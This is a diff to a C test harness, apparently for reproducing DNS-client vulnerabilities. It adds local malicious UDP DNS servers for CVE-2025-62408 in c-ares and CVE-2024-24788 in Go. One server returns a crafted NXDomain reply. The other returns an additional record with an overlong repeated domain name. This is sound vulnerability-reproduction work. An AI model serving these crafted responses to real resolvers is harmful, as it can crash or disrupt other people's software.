@@ -331,8 +331,26 @@ internal void bdns_c02(bool32 no_vuln)
 {
     // c-ares
     // CVE-2025-62408
-    printf("c02\n");
+    printf("c02 : 127.0.0.1:%hu\n", LISTENING_PORT);
     Temp scratch = scratch_begin(0, 0);
+
+    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
+    DNS_Msg query = {0};
+    NET_Client client = net_listener_accept(scratch.arena, server.listener);
+    printf("Accepted UDP client\n");
+    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.rcode          = DNS_RCode_NXDomain;
+
+        dns_pack_msg(client.send_buffer, &msg);
+        net_client_send_from_ring(&client);
+        dns_server_shutdown_and_release(&server);
+        net_client_close(client);
+    }
 
     scratch_end(scratch);
 }
@@ -385,8 +403,40 @@ internal void bdns_go1(bool32 no_vuln)
 {
     // golang
     // CVE-2024-24788
-    printf("go1\n");
+    printf("go1 : 127.0.0.1:%hu\n", LISTENING_PORT);
     Temp scratch = scratch_begin(0, 0);
+
+    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
+    DNS_Msg query = {0};
+    NET_Client client = net_listener_accept(scratch.arena, server.listener);
+    printf("Accepted UDP client\n");
+    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.rcode          = DNS_RCode_NoError;
+
+        msg.header.additional_count = 1;
+
+        msg.extra = push_array(scratch.arena, DNS_RR, msg.header.additional_count);
+
+        msg.extra[0].name = s("superduperlongdomainname."
+                                   "superduperlongdomainname."
+                                   "superduperlongdomainname."
+                                   "superduperlongdomainname."
+                                   "superduperlongdomainname."
+                                   "superduperlongdomainname."
+                                   "superduperlongdomainname.");
+        msg.extra[0].type = query.question[0].type;
+        msg.extra[0].class = query.question[0].class;
+        msg.extra[0].ttl = 300;
+        msg.extra[0].rdata.A.addr = 0xFFFFFFFF;
+
+        dns_pack_msg(client.send_buffer, &msg);
+        net_client_send_from_ring(&client);
+    }
 
     scratch_end(scratch);
 }
